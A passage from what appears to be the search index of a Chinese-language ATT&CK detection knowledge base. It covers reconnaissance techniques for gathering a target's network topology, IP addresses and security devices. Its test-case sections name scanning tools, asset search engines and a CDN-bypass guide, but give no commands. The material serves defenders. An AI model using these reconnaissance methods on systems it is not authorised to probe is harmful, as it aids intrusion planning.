b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_7","text":"MITRE-ATT&CK-T1590-003 https://attack.mitre.org/techniques/T1590/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/","text":"T1590-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u62d3\u6251 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u62d3\u6251\u7684\u4fe1\u606f\u3002\u7f51\u7edc\u62d3\u6251\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\uff0c\u5305\u62ec\u9762\u5411\u5916\u90e8\u548c\u5185\u90e8\u7f51\u7edc\u73af\u5883\u7684\u7269\u7406\u6216\u903b\u8f91\u5e03\u7f6e\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u8fd8\u5305\u62ec\u6709\u5173\u7f51\u7edc\u8bbe\u5907\uff08\u7f51\u5173\uff0c\u8def\u7531\u5668\u7b49\uff09\u548c\u5176\u4ed6\u57fa\u7840\u7ed3\u6784\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u3002\u7f51\u7edc\u62d3\u6251\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5728\u5185\u7f51\u8fdb\u884c\u7f51\u7edc\u62d3\u6251\u4fe1\u606f\u6536\u96c6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u5bf9\u4e8e\u5728\u5916\u7f51\u8fdb\u884c\u6536\u96c6\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c37\u6b4c\u8bed\u6cd5\u3001\u7f51\u76d8\u68c0\u7d22\u3001QQ\u7fa4\u7b49\u65b9\u6cd5\u6536\u96c6\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590-004 https://attack.mitre.org/techniques/T1590/004/","title":"T1590-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u62d3\u6251"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#t1590-004-","text":"","title":"T1590-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u62d3\u6251"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u62d3\u6251\u7684\u4fe1\u606f\u3002\u7f51\u7edc\u62d3\u6251\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\uff0c\u5305\u62ec\u9762\u5411\u5916\u90e8\u548c\u5185\u90e8\u7f51\u7edc\u73af\u5883\u7684\u7269\u7406\u6216\u903b\u8f91\u5e03\u7f6e\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u8fd8\u5305\u62ec\u6709\u5173\u7f51\u7edc\u8bbe\u5907\uff08\u7f51\u5173\uff0c\u8def\u7531\u5668\u7b49\uff09\u548c\u5176\u4ed6\u57fa\u7840\u7ed3\u6784\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u3002\u7f51\u7edc\u62d3\u6251\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_1","text":"\u5728\u5185\u7f51\u8fdb\u884c\u7f51\u7edc\u62d3\u6251\u4fe1\u606f\u6536\u96c6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u5bf9\u4e8e\u5728\u5916\u7f51\u8fdb\u884c\u6536\u96c6\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c37\u6b4c\u8bed\u6cd5\u3001\u7f51\u76d8\u68c0\u7d22\u3001QQ\u7fa4\u7b49\u65b9\u6cd5\u6536\u96c6\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_7","text":"MITRE-ATT&CK-T1590-004 https://attack.mitre.org/techniques/T1590/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/","text":"T1590-005-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-IP\u5730\u5740 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684IP\u5730\u5740\u4fe1\u606f\u3002\u516c\u5171IP\u5730\u5740\u53ef\u80fd\u662f\u6309\u5757\u5206\u914d\u7ed9\u4f01\u4e1a\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u7cfb\u5217\u8fde\u7eed\u5730\u5740\u5206\u914d\u7ed9\u4f01\u4e1a\u7684\u3002\u5df2\u5206\u914dIP\u5730\u5740\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\u4fe1\u606f\uff0c\u6bd4\u5982\u5f53\u524d\u4f7f\u7528\u7684IP\u5730\u5740\u3002\u6536\u96c6\u5df2\u5206\u914d\u7684IP\u5730\u5740\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e86\u89e3\u5f53\u524d\u5728\u7528\u7684IP\u5730\u5740\uff0c\u4e5f\u53ef\u80fd\u63a8\u5bfc\u51fa\u653b\u51fb\u76ee\u6807\u7684\u5176\u4ed6\u7ec6\u8282\uff0c\u6bd4\u5982\u7ec4\u7ec7\u89c4\u6a21\u3001\u5730\u7406\u4f4d\u7f6e\u3001Internet\u670d\u52a1\u63d0\u4f9b\u5546\u4ee5\u53ca\u9762\u5411\u516c\u4f17\u57fa\u7840\u8bbe\u65bd\u7684\u90e8\u7f72\u4f4d\u7f6e/\u65b9\u5f0f\u3002 IP\u5730\u5740\u4fe1\u606f\u53ef\u80fd\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u7b49\u65b9\u5f0f\u4e3b\u52a8\u6536\u96c6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\u5982\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u626b\u63cf\u5de5\u5177\uff1anmap\u3001goby\u3001masscan\u7b49 \u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff1afofa\u3001zoomeye\u7b49 \u7ed5\u8fc7CDN\u67e5\u627e\u771f\u5b9eIP: https://blog.csdn.net/weixin_45677119/article/details/110870703 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590-005 https://attack.mitre.org/techniques/T1590/005/ \u6e17\u900f\u6d4b\u8bd5-----\u4fe1\u606f\u6536\u96c6\uff08\u901a\u8fc7DNS\u89e3\u6790\u627eIP\u5730\u5740\u3001CDN\u3001IP\u67e5\u8be2\u3001IP\u7269\u7406\u5730\u5740\u3001\u641c\u7d22\u5f15\u64ce\u3001\u7f51\u7ad9\u4fe1\u606f\u6536\u96c6\uff09 https://blog.csdn.net/weixin_45677119/article/details/110870703","title":"T1590-005-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-IP\u5730\u5740"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#t1590-005-ip","text":"","title":"T1590-005-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-IP\u5730\u5740"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684IP\u5730\u5740\u4fe1\u606f\u3002\u516c\u5171IP\u5730\u5740\u53ef\u80fd\u662f\u6309\u5757\u5206\u914d\u7ed9\u4f01\u4e1a\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u7cfb\u5217\u8fde\u7eed\u5730\u5740\u5206\u914d\u7ed9\u4f01\u4e1a\u7684\u3002\u5df2\u5206\u914dIP\u5730\u5740\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\u4fe1\u606f\uff0c\u6bd4\u5982\u5f53\u524d\u4f7f\u7528\u7684IP\u5730\u5740\u3002\u6536\u96c6\u5df2\u5206\u914d\u7684IP\u5730\u5740\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e86\u89e3\u5f53\u524d\u5728\u7528\u7684IP\u5730\u5740\uff0c\u4e5f\u53ef\u80fd\u63a8\u5bfc\u51fa\u653b\u51fb\u76ee\u6807\u7684\u5176\u4ed6\u7ec6\u8282\uff0c\u6bd4\u5982\u7ec4\u7ec7\u89c4\u6a21\u3001\u5730\u7406\u4f4d\u7f6e\u3001Internet\u670d\u52a1\u63d0\u4f9b\u5546\u4ee5\u53ca\u9762\u5411\u516c\u4f17\u57fa\u7840\u8bbe\u65bd\u7684\u90e8\u7f72\u4f4d\u7f6e/\u65b9\u5f0f\u3002 IP\u5730\u5740\u4fe1\u606f\u53ef\u80fd\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u7b49\u65b9\u5f0f\u4e3b\u52a8\u6536\u96c6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\u5982\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_1","text":"\u626b\u63cf\u5de5\u5177\uff1anmap\u3001goby\u3001masscan\u7b49 \u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff1afofa\u3001zoomeye\u7b49 \u7ed5\u8fc7CDN\u67e5\u627e\u771f\u5b9eIP: https://blog.csdn.net/weixin_45677119/article/details/110870703","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_7","text":"MITRE-ATT&CK-T1590-005 https://attack.mitre.org/techniques/T1590/005/ \u6e17\u900f\u6d4b\u8bd5-----\u4fe1\u606f\u6536\u96c6\uff08\u901a\u8fc7DNS\u89e3\u6790\u627eIP\u5730\u5740\u3001CDN\u3001IP\u67e5\u8be2\u3001IP\u7269\u7406\u5730\u5740\u3001\u641c\u7d22\u5f15\u64ce\u3001\u7f51\u7ad9\u4fe1\u606f\u6536\u96c6\uff09 https://blog.csdn.net/weixin_45677119/article/details/110870703","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/","text":"T1590-006-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u5b89\u5168\u8bbe\u5907 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4fe1\u606f\u3002\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u5df2\u90e8\u7f72\u7684\u9632\u706b\u5899\uff0c\u5185\u5bb9\u7b5b\u9009\u5668\u548c\u4ee3\u7406/\u5821\u5792\u4e3b\u673a\u7684\u5b58\u5728\u548c\u8be6\u7ec6\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u9488\u5bf9\u5730\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08NIDS\uff09\u6216\u5176\u4ed6\u4e0e\u9632\u5fa1\u6027\u7f51\u7edc\u5b89\u5168\u64cd\u4f5c\u6709\u5173\u7684\u8bbe\u5907\u7684\u4fe1\u606f\u3002 